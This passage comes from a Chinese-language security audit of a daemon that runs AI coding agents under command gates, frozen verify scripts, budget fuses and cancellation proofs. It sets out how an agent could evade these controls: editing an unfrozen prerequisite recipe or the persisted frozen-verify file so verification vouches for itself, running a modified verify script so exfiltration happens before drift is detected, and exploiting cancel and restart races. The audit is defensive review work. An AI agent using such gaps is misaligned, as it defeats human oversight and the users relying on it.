`package_script` 已把 `pre/main/post` 纳入 digest，但 `justfile:<name>` 只取
从目标 recipe 行到下一个顶层 recipe 的文本（`verifyFreeze.ts:28-46,58-67`）。
它没有解析/冻结目标的 prerequisites、被依赖 recipe、`import`、变量或
settings。比如 `test: lint` 的 `test` 正文保持不变，agent 只改 `lint:`
recipe，`precheckVerify` 仍会通过，随后 `just test` 执行被改过的 `lint`
（`executor.ts:736-755`）。这是白名单 oracle 的可执行闭包漏冻结，不是已登记
的 config/TOCTOU P1；恶意仓库可用它让 verify 自证，T19 为 A1/A2、生产可达。

### 5.5 持久化冻结产物可被 agent 改写，恢复还会“重冻当前仓”

首跑把 `FrozenVerify[]` 原样 JSON 写到
`~/.saydo/tier1/runs/<runId>/frozen-verify.json`，恢复时
`loadFrozen` 只是 `JSON.parse(...) as FrozenVerify[]`，没有 schema、digest、
owner/mode 或与 dispatch 记录的交叉核对（`executor.ts:562,1080-1085`）。
恢复路径只要数组非空就信其 `argv/scriptDigest`（`executor.ts:1001,1047-1054`）。
同 UID agent 已有 S1 的 `node/python` 或内置 `write` 能力（
`cmdEffect.ts:19-20,102-109`; `RESULT.md:41-42`），可以把 `argv` 换成
任意解释器/外发命令、把 digest 改成当前值；重启后 precheck 会对着伪造
冻结物执行。若文件缺失，代码反而从当前仓 `project.toml` 重新 freeze
（`executor.ts:1047-1054`），无法证明是 dispatch 时的闭包，形成“恢复重冻自评”。
这是生产可达 A1/A2，不能归入已登记 P1。

### 5.6 verify 命令在 gate 层没有重校脚本 digest

`handleGateRequest` 只要 `req.command` 与冻结的 argv 字符串相同，就把该次
shell 的 effect 直接标成 `run_registered_verify`（`executor.ts:245-248`）。
这里没有读取当前 `package.json`/`justfile` 或比较 `scriptDigest`；重校只在
agent 退出后的 `settleAttempt` 才发生（`executor.ts:736-755`；
`verifyFreeze.ts:85-107`）。因此 agent 可先用内置 `write` 改 verify 正文，
再主动执行同样的 `pnpm run test`/`just ci`：命令本身绕过 S2/S3 gate，恶意
脚本的外发/删除副作用先发生，最后才以 `content_drift` blocked。冻结是
settle 前的证据门，不是运行中 verify 的即时授权门；T35 为 A1/生产可达。

## 6. 红线 5：G4 凭据剥离与 setup

这条红线在声明范围内成立：

- `strippedAgentEnv` 只复制 PATH、HOME、USER、LOGNAME、SHELL、locale、TERM、TMPDIR
  （`executor.ts:65-75`），真实 agent spawn 使用它
  （`executor.ts:82-91`），daemon 独立 verify 也使用它
  （`executor.ts:807-815`）。
- setup 只接受 pnpm/npm/yarn 的 install/i/ci 形态，安全 flag 过滤后强制
  `--ignore-scripts`（`projectConfig.ts:43-55`）；adapter 默认也写死
  `--ignore-scripts`（`adapter.ts:115-120`）。
- evidence 对 key/token 剥离和 setup 结果有明确记录
  （`e2e/evidence/tier1-conformance.md:38-46`）。

但 HOME、PATH、TMPDIR 仍是残面，且 evidence 已诚实登记 HOME 下的
`~/.ssh` 等文件系统凭据风险（同上 `:42-46`）。这不是本轮新发现，判定为
P1，而非把 G4 写成“凭据不可见”的绝对保证。gate 日志原文泄漏见 §2.2。

## 7. 红线 6：三熔断

### 7.1 单字段 approvalWaitingSince 会低估并发等待

每个 run 只有一个 `approvalWaitingSince`（`executor.ts:186-196`）。每次 gate
请求开始都覆盖它，结束时把当前时间减去该值并置 null
（`executor.ts:250,274-277`）。两个并行 S2 请求可形成：

```text
t=0  A 开始，since=0
t=10 B 开始，since=10（覆盖 A）
t=20 A 结束，累计 10，since=null
t=30 B 结束，累计 0
```

真实审批等待区间是 30 秒，计入值只有 10 秒。`enforceBudgets` 以该值从
墙钟扣除（`executor.ts:368-376`），所以这是**低估活跃墙钟并延后熔断**，
不是“过严导致早停”。Cursor 事件可能并发 tool call，不能用 happy-path 的
串行 `ls` 推翻。T10 前半是生产可达 A2。

### 7.2 重启把 wall/turn/cursor 清零，成本只查 API

`tier1_runs` DDL 只有状态、proof、时间戳，没有活跃开始点、tool counter 或
approval wait 累计字段（`storage/ddl.ts:98-104`）。recover 为每个旧 run
重新设置 `startedMs=Date.now()`、`toolCalls=0`、`approvalWaitMs=0`、
`eventLine=0`（`executor.ts:989-1012`）。每次 daemon 崩溃/重启都可重新获得
完整 wall/turn 预算；同一 run 的旧 event 文件还会从 line 0 重新计数。

成本查询只汇总 `source='api'`（`executor.ts:382-390`），订阅态为 NULL 是
canonical 允许的记账口径，但它更依赖前两道熔断。重启重置后，连续重启可以
让一个订阅 run 无限延长，故 T10 后半是 A2；不需要恶意 agent，普通 daemon
崩溃即可触发。

### 7.3 事件计数的未知形态不作废

回合只在 raw line 含精确 `subtype:"started"` 时递增，shell 还需命中有限
工具名正则（`executor.ts:667-685`）。parser unknown/parse_error 被忽略
（`executor.ts:674-676`）。这会低估 turn 和 shell 两个熔断，和 T4 相同构造
形成 A2；15 秒 tick 本身还会带来上界 overshoot，但不是主要漏洞。

## 8. 红线 7：settle barrier、proof 与 outbox

### 8.1 Proof 生成和验收交叉核对成立

verify 全部通过后才 `git add`/`git write-tree`，再严格 parse
Tier1SettleProof（`executor.ts:736-779`）；`reviewTask(approve)` 要求
run=`settled_review`、tree 存在、proof 能过 strict schema，并核对
`taskId/attempt/runId/treeSha`（`operations.ts:247-270`）。attempt 作为
ready occurrence key，retry 使用新 attempt（`executor.ts:788-795`；
`operations.ts:418-453`），这部分与 canonical `09-data-contracts.md:572-585`
一致。

### 8.2 barrier 不是一个原子提交，丢 outbox 可生产发生

settle 顺序是：

1. `transitionTier1Run(...settled_review)`；
2. `transitionTask(...ready_for_review)`；
3. `callbacks.enqueue(...)`。

三步分散在 `executor.ts:781-801`，没有同一 SQLite transaction。进程可在任一步
之间崩溃；`CallbackEngine.enqueue` 对 DB/去重异常只返回
`enqueued:false`（`callback/engine.ts:70-112`），executor 只写审计中的
`enqueued`，没有补偿队列或启动对账。结果可以是：

- run 已 settled、task 仍 running；
- task 已 ready、没有 callback outbox；
- outbox 插入失败而 task 永久等不到回叫。

目标树 `recover` 只扫描 `reserved/running/step_paused/cancel_requested`
（`executor.ts:915-918`），不会修复 `settled_review`/`ready_for_review`
半程。T11 为 A2/生产可达。

### 8.3 result 不是 settle 的必需条件，事件留痕失败仍推进

`consumeEventLine` 只把 result 文本存到 `resultText`，没有 `resultSeen` 约束
（`executor.ts:663-665`）；`settleAttempt` 只检查 exitCode、observedModel、
verify 和 tree（`executor.ts:714-779`）。一个 wrapper 可以以 0 退出而不发
result，仍有机会进入 ready。`realAgentSpawner` 还用任意 raw line 的正则
`"type":"result"` 作为完成信号（`executor.ts:114-123`），不是严格 parse 后
的顶层 result；未严格解析的嵌套对象字段或伪造 JSON 行只要包含同样片段就
可能提前触发 `finish`/hard-kill，随后残缺 worktree 仍按 exitCode/verify 进入结算。
属于 B/A2 的证据完整性缺口。

事件写盘失败被吞掉但 line counter 继续推进（`executor.ts:651-657`），
recover 又把 `eventLine` 清零（`executor.ts:1007-1012`）。proof 的
`events:<runId>:line:N` 可能指向不存在或错误的游标，削弱 settle barrier
可追溯性，严重度 B。

blocked/failed 的最小 proof schema 在 callback 层有校验
（`callback/engine.ts:74-80`），executor 也写 `exitEvidence+transcriptCursor`
（`executor.ts:872-891`），这一窄项成立；但 enqueue 返回值被忽略的缺口同样
适用于 blocked/failed。

### 8.4 observedModel “不可解析”被静默当作可接受

目标树只在 `observedModel` 为空时失败；若配置模型或事件模型名无法由
`familyFromModelName` 解析为族（返回 `null`），条件
`expectedFamily !== null && observedFamily !== null && mismatch` 不触发，
run 仍可继续 verify/settle（`executor.ts:718-727`;
`family.ts:40-61`; model 装配允许空字符串见 `index.ts:644-650`）。
canonical 对 cursor 运行时族断言要求缺失、改写或
不可解析都作废，而不是“只有两个已知族且不相等才拒”（`09-data-contracts.md:750,771`）。
因此 vendor 新模型名或伪造 `system.init.model` 可绕过严格模型绑定，T18 为
A2/B；这也与 §3.3 的 unknown event 宽容叠加。

## 9. 红线 8：取消、晚到事件与 §12-7 恢复

### 9.1 取消与审批存在真实竞态

`requestCancel` 只把 task CAS 到 `cancel_requested`，然后另起一条裸
`UPDATE tier1_runs`（`operations.ts:104-120`）。gate 请求若正等待 S2：

1. cancel 先改 DB；
2. 下一 tick 尚未执行 `reapCancellations`（`executor.ts:319-365`）；
3. 旧 receipt 被 accept；
4. `handleGateRequest` 没有重新查询 task/run，返回 allow。

而在下一 tick 之前，`run.abort` 仍为空；即使没有旧 receipt，新的
S0/S1 gate 请求也会在 `decideCommand` 的自动放行分支返回 allow
（`executor.ts:232-295`）。这会在用户已取消后仍执行 shell 命令，T7 是
A1/生产可达。

### 9.2 崩溃窗口和 proof 绑定错误

`requestCancel` 的 task 更新与 run 更新不在事务内
（`operations.ts:112-119`）。若两句之间 daemon 崩溃，重启时 task 已
`cancel_requested`、run 仍 `running`。recover 的“不一致”分支会杀孤儿并把
run 走到 `cancel_settled`，但不会把 task 结算（`executor.ts:958-985`），
task 可永久停在 `cancel_requested`。

反向地，`settleCancel` 先把 task 写成 `cancel_settled`，再把**所有**该 task
的 `cancel_requested` runs 批量写成 `cancel_settled`
（`operations.ts:128-145`）。中间崩溃会留下 terminal task + active run；
重启再次调用 `settleCancel` 会因 task 已不是 `cancel_requested` 而报错并
继续，run 仍不收敛。

该函数也不验证 `proof.runId` 是否等于被更新的 run；只按
`WHERE task_id=? AND state='cancel_requested'` 批量套用同一 JSON
（`operations.ts:138-142`）。多 run/数据异常时会把 A run 的 proof 写到 B
run。`isCancelProofComplete` 只查布尔值和非空字符串，没有调用
`tier1CancelProofSchema.parse`（`operations.ts:96-98`），运行时契约再弱一层。

### 9.3 cancel_requested 恢复没有先杀 detached agent

真实 spawner 是 detached process group（`executor.ts:88-93`）。但 recover
遇到 `cancel_requested` 时直接假设“进程必死”，构造 proof 并 settle，完全不
调用 `killOrphanAgent`（`executor.ts:924-938`）。daemon 被 kill -9 或异常退出
时，旧 agent 可继续写 worktree、继续发 hook，随后 task 已显示
cancel_settled；该 run 进入 terminal 后后续 `recover()` 也不再扫描它，因而
可能永远失去自动 reap 机会。这是 A2/生产可达，且直接推翻“取消后先 reap”
的红线。

只有 `running/reserved` 的新会话路径才在 spawn 前调用 `killOrphanAgent`
（`executor.ts:1029-1036`）；`recoverAttempt` 在供给和 spawn 之间也没有再
检查 task/run 是否刚被取消（`executor.ts:1057-1077`）。

### 9.4 晚到事件函数存在，但生产链没有使用

`operations.ts:185-202` 定义了 `isLateEventHistory`，但全仓搜索没有调用点。
`consumeEventLine` 在 run 从 `active` 删除后仍可被旧 proc 回调，继续追加
events、递增 line、解析 tool call（`executor.ts:651-676,894-910`），没有拿
`cancelProof.lastEventId` 做历史判定，也没有抑制旧 run 的回叫。canonical 要求
“旧 run 晚到事件转历史”，当前只有函数和注释，没有执行语义，T9 为 A2。

`writeAgentPid` 写失败被吞掉（`executor.ts:1096-1103`），`killOrphanAgent`
也没有 start-time/cmdline 身份校验，PID 重用时存在误杀其他进程的潜在面
（`executor.ts:1105-1123`）。优雅 shutdown 3 秒后退出，而 hard kill 的 5 秒
兜底 timer 可能尚未触发（`executor.ts:1126-1135`）；由于 agent 是 detached，
daemon 在 3 秒退出后该 5 秒 timer 也不会再执行，SIGTERM 未收住时旧进程可一直
活到下次启动的 `killOrphanAgent`，不是可靠的当场 reap。

### 9.5 取消可能被失败状态覆盖

task 状态机把 `cancel_requested` 放进 `FAILABLE`，允许 L/P 转 failed
（`contracts/statemachines/task.ts:64-81`）。`settleAttempt` 在看到 agent
非零退出时直接 `finalizeFailure`，随后用 `transitionTask(..., "failed")`
（`executor.ts:714-716,824-853`），没有先重读取消意图。若非零退出和用户
取消竞态发生在同一 tick，取消会被覆盖成 failed，且 run 可能仍在
`cancel_requested`。这是 A2/生产可达。

## 10. 红线 9：状态机、CAS 与裸 UPDATE

### 10.1 DAO 的统一 transition helper 本身是正确的

`transitionTask` 先 `canTransitionTask`，再 `WHERE id AND status=from` CAS
（`storage/dao/tasks.ts:74-114`）；`transitionTier1Run` 同样先
`canTransitionTier1Run`、再 `WHERE id AND state=from`
（`storage/dao/tasks.ts:170-207`）。claim 的 queued→running + run insert
在 transaction 内（`executor.ts:457-481`）。这些是应保留的安全基元。

### 10.2 Tier1 操作仍绕过基元

以下状态写没有经过统一 helper，且多处没有同一事务：

- `requestCancel`：`tier1_runs` 直接 `state='cancel_requested'`
  （`operations.ts:118`）；
- `settleCancel`：task 和 run 各自裸写
  （`operations.ts:135-142`）；
- `settleCancelNoActiveRun`：只 CAS task，不保护 count→write 窗口
  （`operations.ts:151-168`）；
- `reviewTask` 的 approve/request_changes/reject 虽有显式
  `canTransitionTask` + `WHERE status=from` CAS（前两条还包在 transaction
  内），但没有调用统一 `transitionTask`；reject 的 run 更新仍是裸写
  （`operations.ts:272-330`）；
- `verifyAndCompleteMerge` 只做手写的当前状态检查再裸 CAS 到
  `task_done`，没有调用 `canTransitionTask`/统一 helper
  （`operations.ts:355-379`）；
- parked aging 虽先调用 `canTransitionTask`，最终仍自行 SQL 更新
  （`approvals/parkAging.ts:30-49`）。

这不仅是风格问题：统一 helper 的 CAS/状态检查无法覆盖这些路径，正是 T8、
T12 的崩溃和竞态来源。严重度 A2/B。

另一个潜在重复执行点在 `claimNext`：查询允许“task=running 且无活跃 run”
（`executor.ts:411-424`），但该分支在 transaction 内没有对 task 做
`running→running` CAS 或唯一活跃 run 约束（`executor.ts:457-476`）。单进程
15 秒 tick 因内存 `active` 通常不会重复；两个 daemon 进程、重启竞态或
外部误启动时可各插入一个 reserved run。故为 B/潜在，不把它夸大为单进程
happy-path 已证实漏洞。

## 11. 红线 10：契约一致性与 canonical 回写

### 11.1 proof/状态/attempt 的主形状一致

contracts 的 Tier1SettleProof、Tier1CancelProof、minimal proof 字段与
canonical §9 一致（`packages/contracts/src/types/task.ts:75-107`；
`voice-coding/docs/09-data-contracts.md:572-585`）。`reviewTask` 的三态返回
也与已回写的 §13 口径一致（`operations.ts:204-223`；
canonical `09-data-contracts.md:814-823`）。

### 11.2 callback 层的 ready proof 检查比 canonical schema 弱

`CallbackEngine.isSettleComplete` 只检查五个字符串非空
（`callback/engine.ts:20-30`），不调用 `tier1SettleProofSchema.parse`，
也不检查 attempt、packageRevision、settledAt 的类型和一致性。当前唯一生产
caller 是 executor，且它先 strict parse，所以风险尚未被该 caller 放大；但
callback 是公共写口，未来/测试/其他路径可把伪 proof 写成 ready outbox。
这是 B/P1 的“契约门在错误层级”问题。

### 11.3 project.toml、DDL 和工具面存在静默双改

- `projectTomlSchema` 是 `z.looseObject`，只消费 verify/setup，未知域静默
  接受（`projectConfig.ts:16-31,58-81`）。canonical 要求项目层只允许
  `[project]/[git]/[verify]/[setup]`，出现 `models/providers/gate0/hopper/
  privacy/voice` 应拒绝（`voice-coding/docs/09-data-contracts.md:706-720`）。
  静默忽略会让调用方误以为配置生效，属于 B/P1。
- canonical 还要求 `proposeStart`/`confirmAndDispatch` 先按
  `[params].enabled_project_types` 做类型能力门，未启用类型必须
  `project_type_not_enabled` fail-closed（`09-data-contracts.md:798-800`）。
  目标树 `proposeStart`/`dispatchApprovedPackage` 只取 session/package，
  没有读取 project type 或 enabled 集（`brain/liveTools.ts:192-247`），因此
  schema 中的 `writing`/其他前瞻类型可直接进入 Tier1，属于未登记的契约放宽。
- DDL v1 的 project type CHECK 没有 canonical 后来补入的 `writing`
  （`storage/ddl.ts:5-11` 对比 canonical `09-data-contracts.md:443-449`）。
  这是已知前瞻词表未同步，不应称为本批全契约一致。
- canonical §13 有 `answerAgentQuestion(taskId, questionId, answer)`；
  `brain/liveTools.ts:374-528` 注册了 cancel/review/retry/steer/approve/merge，
  没有 `answerAgentQuestion`。blocked 问题只能借 `retryTask.message`，签名和
  语义不等价（canonical `09-data-contracts.md:801-809`），为 B/P1。
- canonical §11 还要求每次 BYOA/agent invocation 留 configured/routed provider、
  argv digest、cwd、笼档、observedModel、tool 计数和证据 digest 的不可变审计
  （`09-data-contracts.md:750,756`）。目标树的 `Tier1Executor` 只写
  `tier1.claim` 与 settle 审计，没有给本次 `cursor-agent` spawn 落
  invocation 记录（`executor.ts:484-487,594-605,797-801`）；这不否认独立
  BYOA provider 的其他调用记录，而是本执行器缺少自己的绑定。事后无法从
  Tier1 audit 独立证明“声明的二进制/模型/工具计数”与实际调用一致，属 B/P1。
- §11 回写文字宣称 `versions/<ver>/cursor-agent` 绝对锁定副本
  （canonical `09-data-contracts.md:745`），实现只做 absolute + includes +
  一次断言（§3.5），属于文字过度声称。

### 11.4 `step_confirm` 的模式承诺没有落到执行状态机

派单起草器把包固定成 `mode: "step_confirm"`（`brain/liveTools.ts:231-243`），
而 `renderSpec` 写入 task 的正文只包含范围/验收，不包含 `plan.seq`（
`brain/liveTools.ts:158-168`）。目标树 executor 的正常路径从 `running` 直接做
退出/verify/settle，未读取 package mode/plan.seq，也没有把 task 置为
`paused_step_boundary` 或把 `tier1_run` 置为 `step_paused`
（`executor.ts:714-787`；全文件仅在取消、
恢复分支出现这些状态名）。canonical 明确要求逐步确认档包含“每个步骤边界”
确认、30 秒无应答转 `blocked`，以及同一 session 的 `running ⇄ step_paused`
（`docs/04-key-mechanisms.md:168,179,182`；
`09-data-contracts.md:314-316,580`）。因此当前 S2 命令确认不能替代步骤边界
确认；默认派单会跨越所有计划步骤继续跑，属于生产可达的授权/状态机缺口
（T16），不能把 `step_confirm` 名称当作已实现的步界语义。

## 12. 红线 11：零 emoji 与状态词

本轮用 `rg` 对 `packages/daemon/src`、`packages/daemon/test`、Tier1 evidence
（排除用户明示豁免的 raw `events.jsonl`）做了静态扫描，没有发现 literal
emoji。raw agent 事件中的 `\u2705` 位于 `events.jsonl:82-83`，RESULT 明确
说明这是 JSON 转义后的 agent 产物，符合本批豁免，不应把它当成呈现层 emoji。
扫描命令无匹配（本会话原始结果 `rg_exit=1`）：

```text
rg -n --pcre2 '[\x{1F000}-\x{1FAFF}\x{2600}-\x{27BF}]' \
  SayDo/packages/daemon/src \
  SayDo/packages/daemon/test \
  SayDo/e2e/evidence \
  SayDo/e2e/poc/tier1-live-executor/RESULT.md \
  SayDo/e2e/poc/tier1-live-executor/evidence \
  --glob '!events.jsonl'
```

呈现层关键话术也符合约束：

- ready callback 固定为“执行和检查都跑完了,等你验收”
  （`callback/arbitration.ts:64-73`）；
- dispatch 固定为“好,任务排进队列了,到验收点我叫你”
  （`live/dialog.ts:173-185`）；
- Brain instructions 禁止执行态说“完成/做完”
  （`brain/instructions.ts:4-23`）。

因此 T15 在本次扫描范围内成立。raw agent 自然语言里的 “done/任务完成总结”
不由我方呈现层生成，不能用来反向证明我方话术通过，也不能掩盖 T11 的
`result` 必需性缺口。

## 13. 对 evidence “全链成立”表述的校正

`e2e/evidence/tier1-conformance.md:7-9` 把四律、门完整性、三熔断、settle、
恢复统一写成 `[ok]`；同文件后文其实已登记 config/HOME P1 和降级恢复
（`:36,46,64-67`）。本轮静态证据进一步证明：

1. live e2e 只跑了一条正常 `ls` allow 路径（`RESULT.md:5-7,47-51`），没有
   覆盖 T1/T2 的恶意命令；
2. A4 简单“deny 不产生 started”确实不成立，但净计数顺序抵消、未知事件
   忽略和延迟 cancel 仍未被 evidence 排除；
3. 测试文件中有 `GateCanary` 单元类（`gate.ts:82-103`），生产 executor
   使用的是自己的两个整数计数器（`executor.ts:186-192,330-343`），不能把
   类的单元通过等同于生产门的逐命令配对；
4. “恢复起新前 kill orphan”只覆盖 running/reserved 新会话路径，不能覆盖
   `cancel_requested` 分支（§9.3）。

因此 evidence 可保留为“happy-path/conformance 证据”，但不能支持“生产
安全红线逐项已闭合”的总句。

## 14. 最小阻断清单（按先后）

1. 先封闭 `cmdEffect`：改为可证明的 token/AST 解析；wrapper、解释器、外发、
   重定向、refspec、删除和任意未知形态不得落 S0/S1；S3 不得由语音 allow。
2. 把 gate/hook 变成有身份和 digest 的不可写供给，运行中检测变更；canary
   改为带顺序/唯一关联的逐事件配对，并对 unknown/parse_error 立即作废，
   不是两 tick 净计数；`observedModel` 不可解析也必须作废。
3. 收据 accept/consume 必须在数据库层或同一事务检查 `expiresAt`、task/run
   仍 active、receipt 的 run/seq 绑定；取消、预算、canary 一律使 pending
   receipt 失效。
4. 把 cancel、settle、outbox 写入合并为可恢复的事务/补偿协议；proof 绑定
   单一 runId；恢复先 kill/确认进程，再结算；晚到事件必须实际调用历史判定。
5. 将 wall/turn/approval wait/event cursor 持久化或做单调重放，不能在每次
   restart 清零；所有状态写统一走 transition helper。
6. 补齐默认 `step_confirm` 的 plan-step 边界停靠/继续确认，并使
   `paused_step_boundary`/`step_paused` 与 30s blocked 语义真正可恢复。
7. 最后再补 callback strict schema、Plan Delta durable reason、
   `answerAgentQuestion`、project/DDL/canonical 同步，重新生成 evidence。

在上述 A1/A2 项关闭并有针对性反例证据前，不建议把该批标为生产 GO。
